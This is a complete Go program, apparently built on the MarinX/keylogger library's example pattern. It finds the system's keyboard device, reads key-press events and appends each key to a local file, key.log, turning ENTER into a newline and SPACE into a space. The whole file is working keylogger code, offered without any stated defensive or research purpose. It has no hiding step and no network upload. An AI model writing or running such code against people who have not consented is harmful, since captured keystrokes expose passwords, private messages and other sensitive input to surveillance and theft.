package main

import (
	"log"
	"os"

	"github.com/MarinX/keylogger"
	"github.com/sirupsen/logrus"
)

func logger(f *os.File, e keylogger.InputEvent) {
	if e.KeyString() == "ENTER" {
		f.WriteString("\n")
	} else if e.KeyString() == "SPACE" {
		f.WriteString(" ")
	} else {
		f.WriteString(e.KeyString())
	}
}

func main() {

	keyboard := keylogger.FindKeyboardDevice()

	if len(keyboard) <= 0 {
		logrus.Error("No keyboard found...you will need to provide manual input path")
		return
	}

	logrus.Println("Found a keyboard at", keyboard)
	k, err := keylogger.New(keyboard)
	if err != nil {
		logrus.Error(err)
		return
	}
	defer k.Close()

	events := k.Read()
	f, err := os.Create("key.log")
	if err != nil {
		log.Fatal(err)
	}

	defer f.Close()

	// range of events
	for e := range events {
		switch e.Type {
		// EvKey is used to describe state changes of keyboards, buttons, or other key-like devices.
		// check the input_event.go for more events
		case keylogger.EvKey:

			// if the state of key is pressed
			if e.KeyPress() {
				logger(f, e)
			}
			break
		}
	}
	f.Close()
}
